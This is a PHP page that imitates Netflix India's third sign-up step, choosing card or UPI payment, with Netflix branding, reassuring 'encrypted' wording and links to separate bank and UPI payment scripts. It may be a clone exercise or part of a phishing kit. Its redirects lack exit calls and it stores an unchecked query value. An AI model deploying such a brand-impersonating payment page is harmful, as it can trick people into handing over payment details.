<?php
$plan = $_GET['plan'];
session_start();

if (isset($_SESSION['checkBack'])) {
    header("location: phoneRecovery.php");
}

if (isset($plan)) {
    $_SESSION['plan'] = $plan;
}
else{
    header('Location: plan.php');
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;900&display=swap"
        rel="stylesheet" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
    <script src="https://kit.fontawesome.com/4048592ab8.js" crossorigin="anonymous"></script>
    <link rel="icon" href="images/icons8-netflix-48.png" type="image/png">

    <style>
        * {
            padding: 0%;
            margin: 0%;
            box-sizing: border-box;
            font-family: 'poppins', sans-serif;
        }

        header nav {
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 12vh;
            width: 100%;
            padding-left: 1.7rem;
            padding-top: 14px;
            padding-bottom: 1.3rem;
            border-bottom: 1px solid rgba(137, 137, 137, 0.3);
        }

        header img {
            width: 210px;
        }

        nav button {
            min-width: auto;
            width: 90px;
            padding: 10px;
            padding-top: 4px;
            padding-bottom: 4px;
            font-size: .9rem;
            font-weight: 500;
            color: white;
            background-color: red;
            border: none;
            border-radius: 4px;
            margin-right: 3.5rem;
            cursor: pointer;
        }

        nav button:hover {
            background-color: rgb(194, 2, 2);
        }

        #topIcon {
            text-align: center;
            border-radius: 50%;
            font-size: 2.15rem;
            color: red;
            border: 2px solid red;
            width: 50px;
            height: 50px;
            margin: auto;
            margin-top: 3rem;
        }

        #container {
            margin: auto;
            text-align: center;
        }

        #top p {
            font-size: .9rem;
            font-weight: 500;
            margin-top: 2.5rem;
        }

        span {
            font-weight: 700;
        }

        #container h1 {
            font-size: 2rem;
            font-weight: 500;
        }

        #down {
            margin-left: 30rem;
            margin-right: 30rem;
            margin-top: 1rem;
            font-size: 1.05rem;
            font-weight: 400;
        }

        #mar {
            margin-top: 1rem;
        }

        .boxes {
            display: grid;
            /* margin: auto; */
            margin-top: 1.6rem;
            margin-left: 33rem;
        }

        #encrypt {
            text-align: center;
            padding-right: 11rem;
            font-size: .83rem;
        }

        #encrypt i {
            color: rgb(203, 203, 11);
        }

        li img {
            width: 25px;
            height: 25px;
        }

        .box {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 2px solid rgba(137, 137, 137, 0.45);
            height: 60px;
            width: 500px;
            padding-left: 1rem;
            padding-right: 1rem;
            cursor: pointer;
            border-radius: 4px;
            margin-bottom: .5rem;
        }

        #list {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            list-style: none;
        }

        li {
            margin-top: 5px;
        }

        .arrow i {
            font-size: 1.3rem;
        }

        footer {
            padding-bottom: 4rem;
            background-color: #ebebeb;
            margin-top: 10rem;
        }

        #heading {
            padding-left: 11rem;
            padding-top: 2rem;
            font-size: 1rem;
            color: rgb(106, 106, 106);
        }

        #heading a {
            color: rgb(128, 128, 128);
            cursor: pointer;
        }

        #details {
            padding-left: 11rem;
            padding-top: 2rem;
            padding-right: 30rem;
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            padding-bottom: 2rem;
            list-style: none;
        }

        #details li {
            padding-bottom: 10px;
        }

        #details li a {
            color: rgb(134, 134, 134);
            font-size: .8rem;
            cursor: pointer;
        }

        #language1 {
            min-width: auto;
            width: 130px;
            padding: 8px;
            padding-top: 2px;
            padding-bottom: 2px;
            font-size: .9rem;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-left: 16px;
            padding-right: 16px;
            background-color: rgba(255, 255, 255, .09);
            border: 1px solid rgba(71, 71, 71, 0.35);
            color: rgb(129, 129, 129);
            border-radius: 4px;
            outline-color: white;
            outline-offset: 3px;
            cursor: pointer;
            margin-bottom: 1rem;
        }

        #language1 .bi {
            color: #686868;
        }

        #language1 .bi-globe {
            font-size: 17px;
        }

        .india {
            margin-left: 11rem;
        }

        .india p {
            color: rgb(84, 84, 84);
        }
    </style>
</head>

<header>
    <nav>
        <img src="images/Netflix-Logo.wine.svg" alt="">
        <button id="signout">Sign Out</button>
    </nav>
</header>


<body>
    <div id="topIcon">
        <i class="bi bi-lock"></i>
    </div>

    <div id="container">
        <div id="top">
            <p>STEP <span>3</span> OF <span>3</span></p>
            <h1>Choose how to pay</h1>
        </div>
        <div id="down">
            <p>Your payment is encrypted and you can change your payment method at anytime</p>
            <p id="mar"><span>Secure for peace of mind.</span></p>
            <p><span>Cancel easily online.</span></p>
        </div>
    </div>

    <div class="boxes">
        <div>
            <p id="encrypt">End-to-end encrypted <i class="bi bi-lock-fill"></i></p>
        </div>

        <div class="box" id="banking">
            <div id="list">
                <p>Credit or Debit Card</p>
                <li><img src="images/icons8-visa-48.png" alt=""></li>
                <li><img src="images/icons8-bank-48.png" alt=""></li>
                <li><img src="images/icons8-mastercard-48.png" alt=""></li>
            </div>

            <div class="arrow">
                <i class="bi bi-chevron-right"></i>
            </div>
        </div>

        <div class="box" id='upi'>
            <div id="list">
                <p>UPI AutoPay</p>
                <li><img src="images/icons8-bhim-48.png" alt=""></li>
                <li><img src="images/icons8-google-pay-india-48.png" alt=""></li>
                <li><img src="images/icons8-paytm-48.png" alt=""></li>
                <li><img src="images/icons8-phone-pe-48.png" alt=""></li>
            </div>

            <div class="arrow">
                <i class="bi bi-chevron-right"></i>
            </div>
        </div>
    </div>

    <footer>
        <div id="heading">
            <p>Questions? Call <a href="">000-800-919-1694</a></p>
        </div>

        <div id="details">
            <li><a href="">FAQ</a></li>
            <li><a href="">Account</a></li>
            <li><a href="">Investor Relations</a></li>
            <li><a href="">Ways to Watch</a></li>
            <li><a href="">Privacy</a></li>
            <li><a href="">Corporate Information</a></li>
            <li><a href="">Speed Test</a></li>
            <li><a href="">Only on Netflix</a></li>
            <li><a href="">Media Centre</a></li>
            <li><a href="">Jobs</a></li>
            <li><a href="">Terms of Use</a></li>
            <li><a href="">Cookie Preferences</a></li>
        </div>

        <div class="india">
            <button id="language1"><i class="bi bi-globe"></i> English <i class="bi bi-caret-down-fill"></i></button>
            <p>Netflix India</p>
        </div>
    </footer>


    <script>
        document.getElementById('banking').onclick = () => {
            setTimeout(() => {
                window.location.href = "BankPayment.php";
            }, 800);
        };

        document.getElementById('upi').onclick = () => {
            setTimeout(() => {
                window.location.href = "UpiPayment.php";
            }, 800);
        };

        const signOut = document.getElementById('signout');

        signOut.addEventListener('click', () => {
            setTimeout(() => {
                window.location.href = "logout.php";
            }, 1200);
            // console.log('signpout');
        });
    </script>
</body>

</html>